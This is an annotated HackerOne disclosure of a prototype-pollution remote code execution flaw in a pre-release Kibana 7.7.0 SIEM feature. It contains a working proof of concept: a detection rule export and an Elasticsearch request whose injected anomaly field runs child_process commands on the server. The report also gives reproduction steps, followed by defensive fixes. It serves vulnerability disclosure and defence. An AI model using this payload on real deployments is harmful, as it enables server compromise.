# Remote Code Execution via Prototype Pollution in Kibana 7.7.0 SIEM Signal Feature

## Metadata
- **Source:** HackerOne
- **Report:** 861744 | https://hackerone.com/reports/861744
- **Submitted:** 2020-04-28
- **Reporter:** alexbrasetvik
- **Program:** Elastic Bug Bounty
- **Bounty:** Not specified in report
- **Severity:** CRITICAL
- **Vuln:** Prototype Pollution, Remote Code Execution, Unsafe Object Merging
- **CVEs:** None
- **Category:** memory-binary

## Summary
Kibana 7.7.0 contains a prototype pollution vulnerability in the SIEM signal detection engine's machine learning signals feature that allows unauthenticated attackers with index write access to achieve remote code execution. The vulnerability exists in the bulk_create_ml_signals.ts file where untrusted influencer field names from ML anomalies are merged into objects without sanitization, allowing modification of Object.prototype properties.

## Attack scenario
1. Attacker creates a SIEM detection rule using the machine_learning type targeting a specific ML job
2. Attacker crafts a malicious ML anomaly document with influencer_field_name set to a prototype pollution payload like 'foo.__proto__.sourceURL'
3. Attacker inserts the malicious anomaly document into the ML anomalies index with a timestamp within the rule's lookback window
4. Attacker enables or triggers the SIEM detection rule evaluation
5. The rule processor reads the malicious anomaly and merges the influencer field name into an object without sanitization
6. Prototype pollution modifies Object.prototype, allowing execution of injected JavaScript code that spawns child processes

## Root cause
The bulk_create_ml_signals.ts file at line 58 unsafely merges data from ML anomaly influencer fields into JavaScript objects without validating or sanitizing field names. Specifically, influencer_field_name values containing prototype pollution payloads (e.g., __proto__, constructor, prototype) are processed through object assignment operations that pollute the Object prototype chain, allowing arbitrary code execution when the polluted properties are accessed.

## Attacker mindset
The researcher demonstrates responsible disclosure by reporting the vulnerability pre-release, recognizing that fixing critical RCE vulnerabilities before release is significantly less costly than post-release patches. The attacker would exploit this by leveraging their write access to Elasticsearch indices (common for Cloud users) to inject malicious ML anomalies that execute arbitrary system commands through prototype pollution.

## Defensive takeaways
- Implement strict input validation and sanitization on all field names from untrusted sources, specifically rejecting field names containing __proto__, constructor, or prototype
- Use Object.create(null) for objects that will receive user-controlled properties to prevent prototype pollution
- Employ safe object merging utilities that explicitly filter dangerous property names
- Implement a whitelist of allowed field names rather than a blacklist approach
- Apply principle of least privilege - restrict index write access for anomaly indices to trusted services only
- Add code review processes specifically checking for unsafe object merging patterns, especially in security-critical features
- Use static analysis tools to detect prototype pollution vulnerabilities in the codebase

## Variant hunting
Search for other instances of unsafe object merging in the codebase, particularly in: (1) rule evaluation engines processing external data, (2) index document ingestion pipelines, (3) configuration loading from user-supplied JSON, (4) any location where Object.assign, spread operators, or similar patterns are used with untrusted keys. Look for similar patterns in other Kibana plugins beyond SIEM that process ML anomalies or other external data sources.

## MITRE ATT&CK
- T1190
- T1059
- T1203

## Notes
This report is particularly valuable as it demonstrates pre-release responsible disclosure. The researcher explicitly references a previous similar vulnerability (report #852613) that was partially fixed but the fix was incomplete, suggesting the development team may have overlooked this code path. The use of Unicode characters (\u2028\u2029) in the payload indicates an attempt to bypass simple string filtering. The researcher notes that timing/state issues exist ('sometimes disabling and re-enabling it is necessary'), suggesting additional potential race conditions in the signal evaluation logic.

## Full report
<details><summary>Expand</summary>

**Summary:**

Kibana 7.7.0 as per commit [c5f682cb](https://github.com/elastic/kibana/commits/c5f682cb) is vulnerable to a remote code execution vulnerability that is similar to the one reported in https://hackerone.com/reports/852613

Kibana 7.7.0 is not released, so this is an experiment. I know that getting these reports is more valuable to Elastic prior to a release, as the amount of work growing out of a critical vulnerability like this is a lot more _after_ release. It could possibly be more valuable for me to wait until Cloud actually has the release and clearly is in scope, but I have faith in you wanting to encourage people to actually look at code whose release is imminent, so here's the report pre release.

I saw that you have commited the fixes to my previous report: https://github.com/elastic/kibana/commit/68674568efac9070935f07e55dfd1a9f8482663d That fix is part of commit c5f682cb which the following is tested with.

**Description:**

There is a prototype pollution in the new "SIEM signal" feature: https://github.com/elastic/kibana/blob/master/x-pack/plugins/siem/server/lib/detection_engine/signals/bulk_create_ml_signals.ts#L58

The attached recording shows how to exercise this code via a SIEM detection rule. The following JSON-blob is an export of the detection rule used:

```
{"actions":[],"created_at":"2020-04-28T17:19:42.955Z","updated_at":"2020-04-28T18:02:32.489Z","created_by":"elastic","description":"test","enabled":true,"anomaly_threshold":0,"false_positives":[],"from":"now-108015s","id":"ac26797b-9061-485c-889c-79993ca8e209","immutable":false,"interval":"15s","rule_id":"2a5a3f8e-79a9-4101-99d9-b414ed48c0db","output_index":".siem-signals-default","max_signals":100,"machine_learning_job_id":"linux_anomalous_network_activity_ecs","risk_score":50,"name":"test","references":[],"meta":{"from":"30h","kibana_siem_app_url":"https://localhost:5601/app/siem"},"severity":"low","updated_by":"elastic","tags":[],"to":"now","type":"machine_learning","threat":[],"throttle":"no_actions","version":3}
{"exported_count":1,"missing_rules":[],"missing_rules_count":0}
```

If I create a fake ML-anomaly like follows, I can pollute the prototype:

```
PUT /.ml-anomalies-custom-linux_anomalous_network_activity_ecs/_doc/my-anomaly?refresh
{
  "timestamp": 1588093630045,
  "result_type": "record",
  "record_score": 1,
  "job_id": "linux_anomalous_network_activity_ecs",
  "by_field_name": "field_name",
  "by_field_value": "field_value",
  "influencers": [
    {"influencer_field_name": "foo.__proto__.sourceURL", "influencer_field_values": "\u2028\u2029\n;global.process.mainModule.require('child_process').exec('say pwned && open https://www.youtube.com/watch?v=LUsiFV3dsK8')"}
    ]
}
```

Note that the timestamp might need adjusting, as the SIEM rule only looks 30h back in the past as provided.

## Steps To Reproduce:

  1. Import the provided SIEM detection rule.
  1. Create the fake anomaly provided above.
  1. Enable the rule. Sometimes disabling and re-enabling it is necessary, which is probably a bug in itself.
  1. Wait ~15 seconds for the rule to be evaluated, which should execute the code, which on a Mac will cause "pwned" to sound and the youtube clip to open.

## Supporting Material/References:

  * Video walkthrough attached.

## Impact

A user with write access to these indexes (like any Cloud user would have) can achieve full remote code execution.

</details>

---
*Analysed by Claude on 2026-05-12*
